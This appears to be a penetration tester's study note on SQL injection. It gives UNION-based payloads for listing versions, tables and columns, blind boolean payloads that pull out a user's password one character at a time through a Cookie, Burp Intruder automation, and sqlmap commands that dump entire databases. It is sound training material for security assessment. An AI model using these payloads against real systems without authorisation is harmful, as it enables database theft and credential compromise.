### Common SQL commands used during SQLi:

- **_`show databases;`_:** This command lists all the active databases

- **_`show tables;`_:** This command lists all the tables within the database

- **_`SELECT * FROM <table name>;`_:** This command dumps all the information present within the specified table.

- **_`SELECT password FROM users WHERE username = "Tom";`_:** This command returns with the password of the user **Tom** present within the **users** table.
***
### Common SQLi syntax:

- To check for SQLi, use **_`'`_** (single quote) or **_`"`_** (double quotes). If the application responds back with an error, then this confirms that SQLi is present within the application.

- **_`<username>' or 1=1#`_:** This command dumps all the contents of the table since the **_`1=1`_** part makes the statement always True. 

- For **_`UNION`_** based attacks, the number of columns has to be found. This can be done by specifying **_`null`_** values within the **_`UNION`_** based query. 

**_`<value>' UNION SELECT null#`_** ...... **_`<value>' UNION SELECT null,null#`_** ...... **_`<value>' UNION SELECT null,null,null#`_**

When the number of **_`null`_** values matches the number of columns present within the database, the searched value will be returned back.

- **_`UNION`_** based payload can be used to extract information about the database such as **_version_**, **_table names_**

**_`<value>' UNION SELECT null,null,version()#`_** -- This will return with the version of the database

**_`<value>' UNION SELECT null,null,table_name FROM information_schema.tables#`_** -- This will return with the table names for all the tables present within the database

**_`<value>' UNION SELECT null,null,column_name FROM information_schema.columns#`_** -- This will return all the column names for all the tables present within the database
***
### Checking SQLi using SQLmap:

To test a feature within a web application for possible SQL injection, SQLmap can be used with the following methodology:

- Initially, browse to feature hosted by the web application and intercept this request using Burp. 
- Now copy and paste this intercepted request onto a text file, and then provide this file as an input parameter to **_`sqlmap`_**

**_`sqlmap -r request.txt`_**

- **_`sqlmap`_** asks certain questions during the execution, enter the prompts as per requirements and  the output will have all the details about the type of SQL injection present within the feature which is being tested.
***
### Testing Blind SQL injection:

In Blind SQL injection, the output of the query is not returned to the browser. The query can only change the behavior of the application. 

Consider the following example of Blind SQL injection and the methodology to test a blind SQL injection:

- Consider a login form where you are directed to a page that says **WELCOME TO THE DASHBOARD** upon successful login. In case of an unsuccessful login, you will be directed back to the login page. 

- There is a **Cookie** being used for the login, which is being included in the login request. The **Cookie** field is found to be vulnerable to SQL injection. The only way to extract data is to generate and use payloads which implement a TRUE or FALSE condition, and based on the output we can extract data such as username or password.

- The payloads would be simple YES or NO questions written in SQL syntax. To extract information, we'll be using a function called **_SUBSTR()_**, i.e. **SubString**. 

**SYNTAX**:  **_`SUBSTR(string, start, length)`_**

**_`string`_** is the string to extract the specified value from.
**_`start`_** is the starting position for extraction. **_`start`_** can be both, positive and negative. If positive, the extraction is from the beginning of the string. If negative, the extraction is from the end of the string. 
**_`length`_** is the number/length of characters to be extracted.

- The following syntax can be used :
**_`' AND substring((SELECT version()), 1, 1) = '8'#`_** 

This will get the current version of the SQL service and check whether the first value of the version number is **_8_**. If the query returns TRUE, then the response will include the **_WELCOME TO THE DASHBOARD_** message. 

- We can check for the next value in the version number using the below query:
**_`' AND substring((SELECT version()), 1, 2) = '8.'`_**

**NOTE:** By incrementing the **_`length`_** parameter and checking for the next value using **_`' AND substring((SELECT version()), 1, 3) = '8.0'`_**.
Every time the query returns TRUE, the page with the **_WELCOME TO THE DASHBOARD_** is received as response. 
Another way to check whether the query returns TRUE is to check for the _**content length**_ of the response received. If the _**content length**_ is same as that of a response for a query returned TRUE, then the current query is returning TRUE.

-  To extract the password of a known user from the database, the following query can be used as part of the **_Cookie_** -- **_`' AND substring((SELECT password FROM table_name WHERE username = 'username'), 1, 1) = 'a'#`_**

Instead of trying every alphabet manually, this process can be automated by sending the request to **Intruder** and highlighting the parameter to be brute forced. Select the **Attack Type** as **_Sniper_**.
![[Pasted image 20250408172400.png]]

Under the **Payloads** tab of Burp Suite, select the **Payload type** as **_Simple list_** and add elements from `A-Z`, `a-z`, and `0-9` as contents of the payload and launch the attack. The element which returns a unique response length is the first alphabet of the password. 

#### Performing the same attack using `sqlmap`:

- Copy the request with the vulnerable parameter present in the request and save it to a file.
![[Pasted image 20250408175941.png]]

-  Now run **_`sqlmap -r req.txt --level=2`_**. The parameter **_`--level=2`_** is necessary if the injection is performed within the **_Cookie_** of the request. 
Answer all the prompted questions, and the output should display the type of SQL injection present within the **_Cookie_** parameter of the request. 
The output also displays the payload that can be used to test the injection vulnerability manually. 
![[Pasted image 20250408180539.png]]

**NOTE:** Critical information about the vulnerability displayed by **_`sqlmap`_** can be used within the report prepared for this assessment.

- Further, **_`sqlmap`_** can be used to dump the entire database. The following syntax can be used:
**_`sqlmap -r req.txt --level=2 --dump`_**

**NOTE:** A specific table can also be specified to be dumped by using **_`-T <table_name>`_** parameter.
![[Pasted image 20250408181031.png]]
***
